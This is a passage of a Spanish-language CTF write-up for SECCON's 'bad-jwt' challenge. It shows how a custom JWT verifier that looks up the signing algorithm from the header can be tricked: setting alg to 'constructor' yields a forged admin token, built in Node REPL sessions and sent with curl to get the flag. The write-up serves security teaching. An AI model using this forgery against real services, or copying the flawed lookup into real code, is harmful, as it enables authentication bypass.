<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">parsedPayload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">parsePart</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">);</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> { </span><span class="mtk1">header</span><span class="mtk1">: </span><span class="mtk1">parsedHeader</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">: </span><span class="mtk1">parsedPayload</span><span class="mtk1">, </span><span class="mtk1">signature</span><span class="mtk1"> }</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">sign</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">alg</span><span class="mtk1">, </span><span class="mtk9 mtki">payload</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">header</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk1">typ</span><span class="mtk1">: </span><span class="mtk4">'JWT'</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">alg</span><span class="mtk1">: </span><span class="mtk9 mtki">alg</span>
<span class="mtk1">  }</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">signature</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">createSignature</span><span class="mtk1">(</span><span class="mtk1">header</span><span class="mtk1">, </span><span class="mtk9 mtki">payload</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">);</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`</span><span class="mtk5">${</span><span class="mtk8">stringifyPart</span><span class="mtk1">(</span><span class="mtk1">header</span><span class="mtk1">)</span><span class="mtk5">}</span><span class="mtk4">.</span><span class="mtk5">${</span><span class="mtk8">stringifyPart</span><span class="mtk1">(</span><span class="mtk9 mtki">payload</span><span class="mtk1">)</span><span class="mtk5">}</span><span class="mtk4">.</span><span class="mtk5">${</span><span class="mtk1">signature</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">;</span>  
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">token</span><span class="mtk1">;</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">verify</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">token</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">header</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">, </span><span class="mtk1">signature</span><span class="mtk1">: </span><span class="mtk1">expected_signature</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">parseToken</span><span class="mtk1">(</span><span class="mtk9 mtki">token</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">calculated_signature</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">createSignature</span><span class="mtk1">(</span><span class="mtk1">header</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">);</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">calculated_buf</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">from</span><span class="mtk1">(</span><span class="mtk1">calculated_signature</span><span class="mtk1">, </span><span class="mtk4">'base64'</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">expected_buf</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">from</span><span class="mtk1">(</span><span class="mtk1">expected_signature</span><span class="mtk1">, </span><span class="mtk4">'base64'</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">compare</span><span class="mtk1">(</span><span class="mtk1">calculated_buf</span><span class="mtk1">, </span><span class="mtk1">expected_buf</span><span class="mtk1">) </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid signature'</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1">;</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">module</span><span class="mtk1">.</span><span class="mtk7 mtki">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> { </span><span class="mtk8">sign</span><span class="mtk1">, </span><span class="mtk8">verify</span><span class="mtk1"> }</span>
</code></pre></div><h2 id="análisis-del-código-fuente">Análisis del código fuente</h2><p>Del archivo <code>index.js</code>, vemos que necesitamos tener <code>req.session.isAdmin === true</code> para conseguir la <em>flag</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.session.isAdmin </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">FLAG</span><span class="mtk1">);</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">().</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk4">'You are not admin!'</span><span class="mtk1">);</span>  
<span class="mtk1">  }</span>
<span class="mtk1">});</span>
</code></pre></div><p>Y el objeto <code>req.session</code> viene de un <em>token</em> JWT dentro de una <em>cookie</em>, que es verificada por el servidor:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">((</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">, </span><span class="mtk8">next</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">cookies</span><span class="mtk1">.session;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> jwt.</span><span class="mtk8">verify</span><span class="mtk1">(</span><span class="mtk1">token</span><span class="mtk1">, </span><span class="mtk1">secret</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk9 mtki">req</span><span class="mtk1">.session </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1">;</span>
<span class="mtk1">  } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk4">'Authentication failed'</span><span class="mtk1">);</span>  
<span class="mtk1">  }</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">})</span>
</code></pre></div><p>Esta es la función <code>jwt.verify</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">verify</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">token</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">header</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">, </span><span class="mtk1">signature</span><span class="mtk1">: </span><span class="mtk1">expected_signature</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">parseToken</span><span class="mtk1">(</span><span class="mtk9 mtki">token</span><span class="mtk1">);</span>  

<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">calculated_signature</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">createSignature</span><span class="mtk1">(</span><span class="mtk1">header</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">);</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">calculated_buf</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">from</span><span class="mtk1">(</span><span class="mtk1">calculated_signature</span><span class="mtk1">, </span><span class="mtk4">'base64'</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">expected_buf</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">from</span><span class="mtk1">(</span><span class="mtk1">expected_signature</span><span class="mtk1">, </span><span class="mtk4">'base64'</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">compare</span><span class="mtk1">(</span><span class="mtk1">calculated_buf</span><span class="mtk1">, </span><span class="mtk1">expected_buf</span><span class="mtk1">) </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid signature'</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Lo que hace es tomar las partes del <em>token</em> JWT (<code>header</code>, <code>payload</code>, <code>signature</code>) y luego usa el los valores proporcionados de <code>header</code> y <code>payload</code> para calcular una nueva firma utilizando el <code>secret</code> del servidor. Si ambas firmas coinciden en <code>Buffer.compare</code>, la firma se trata como válida.</p><p>Esta es <code>createSignature</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">algorithms</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk8">hs256</span><span class="mtk1">: (</span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span>
<span class="mtk1">    </span><span class="mtk8">base64UrlEncode</span><span class="mtk1">(</span><span class="mtk8 mtku">crypto</span><span class="mtk1">.</span><span class="mtk8">createHmac</span><span class="mtk1">(</span><span class="mtk4">'sha256'</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">).</span><span class="mtk8">update</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">).</span><span class="mtk8">digest</span><span class="mtk1">()),</span>  
<span class="mtk1">  </span><span class="mtk8">hs512</span><span class="mtk1">: (</span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span>
<span class="mtk1">    </span><span class="mtk8">base64UrlEncode</span><span class="mtk1">(</span><span class="mtk8 mtku">crypto</span><span class="mtk1">.</span><span class="mtk8">createHmac</span><span class="mtk1">(</span><span class="mtk4">'sha512'</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">).</span><span class="mtk8">update</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">).</span><span class="mtk8">digest</span><span class="mtk1">()),</span>
<span class="mtk1">}</span>

<span class="mtk3">// ...</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">createSignature</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">header</span><span class="mtk1">, </span><span class="mtk9 mtki">payload</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`</span><span class="mtk5">${</span><span class="mtk8">stringifyPart</span><span class="mtk1">(</span><span class="mtk9 mtki">header</span><span class="mtk1">)</span><span class="mtk5">}</span><span class="mtk4">.</span><span class="mtk5">${</span><span class="mtk8">stringifyPart</span><span class="mtk1">(</span><span class="mtk9 mtki">payload</span><span class="mtk1">)</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">signature</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">algorithms</span><span class="mtk1">[</span><span class="mtk9 mtki">header</span><span class="mtk1">.alg.</span><span class="mtk8">toLowerCase</span><span class="mtk1">()](</span><span class="mtk1">data</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">signature</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Aquí tenemos algo interesante, ya que el algoritmo de firma se toma de <code>header.alg.toLowerCase()</code>.</p><h2 id="solution">Solution</h2><p>Controlamos este parámetro y, por lo tanto, podemos ingresar algo diferente de <code>'hs256'</code> o <code>'hs512'</code> como está previsto. Por ejemplo, dado que estamos llamando a un atributo de un objeto, podemos ingresar <code>'constructor'</code> (esto es parecido a un ataque de <em>Prototype Pollution</em>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span>
Welcome to Node.js v20.8.1.
Type ".help" for more information.
&gt; const crypto = require('crypto');
<span class="code-grey">undefined</span>
&gt;
&gt; const base64UrlEncode = (str) =&gt; {
...   return Buffer.from(str)
...     .toString('base64')
...     .replace(/=*$/g, '')
...     .replace(/\+/g, '-')
...     .replace(/\//g, '_');
... }
<span class="code-grey">undefined</span>
&gt; const algorithms = {
...   hs256: (data, secret) =&gt;
...     base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),  
...   hs512: (data, secret) =&gt;
...     base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
... }
<span class="code-grey">undefined</span>
&gt;
&gt; const stringifyPart = (obj) =&gt; {
...   return base64UrlEncode(JSON.stringify(obj));
... }
<span class="code-grey">undefined</span>
&gt; const createSignature = (header, payload, secret) =&gt; {
...   const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
...   const signature = algorithms[header.alg.toLowerCase()](data, secret);
...   return signature;
... }
<span class="code-grey">undefined</span>
&gt; const secret = require('crypto').randomBytes(32).toString('hex');
<span class="code-grey">undefined</span>
&gt; createSignature({ alg: 'hs256' }, { isAdmin: true }, secret)
<span class="code-dark-green">'LNBaw1lmC_QGltCbDRDwQXkr3A_K-Y4m8lUBhKhZKXU'</span>
&gt; createSignature({ alg: 'constructor' }, { isAdmin: true }, secret)
<span class="code-dark-green">[String: 'eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ']
</code></pre></div><p>¿Ves las diferencias? El segundo solo genera la <em>string</em> <code>&lt;header>.&lt;payload></code> del <em>token</em> JWT, sin firmar en absoluto. Esto sucede porque estamos ejecutando <code>constructor(data, secret)</code>, que es solo la cadena <code>data</code>.</p><p>Y hay otro problema en <code>Buffer.from(calculated_signature, 'base64')</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>&gt; const calculated_signature = createSignature({ alg: 'constructor' }, { isAdmin: true }, secret);
<span class="code-grey">undefined</span>
&gt; calculated_signature
<span class="code-dark-green">[String: 'eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ']</span>
&gt; const calculated_buf = Buffer.from(calculated_signature, 'base64');
<span class="code-grey">undefined</span>
&gt; calculated_buf
&lt;Buffer 7b 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d 7b 22 69 73 41 64 6d 69 6e 22 3a 74 72 75 65 7d&gt;  
&gt; calculated_buf.toString()
<span class="code-dark-green">'{"alg":"constructor"}{"isAdmin":true}'</span>
</code></pre></div><p>Como se puede ver, la parte de <code>[String: </code>se omite, al igual que <code>.</code>, <code>'</code> y <code>]</code>, que no son una caracteres válidos en Base64. Como resultado, solo necesitamos codificar la cadena anterior en Base64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; base64UrlEncode(calculated_buf.toString())
<span class="code-dark-green">'eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ'  
</code></pre></div><p>Esta será la parte de la firma. Y el <em>token</em> JWT completo es solamente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ  
</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Si usamos este token JWT como cookie <code>session</code>, obtendremos la <em>flag</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> bad-jwt.seccon.games:3000 -b <span class="code-dark-green">'session=eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ'</span>  
SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a></li><li><a href="#solution">Solution</a></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>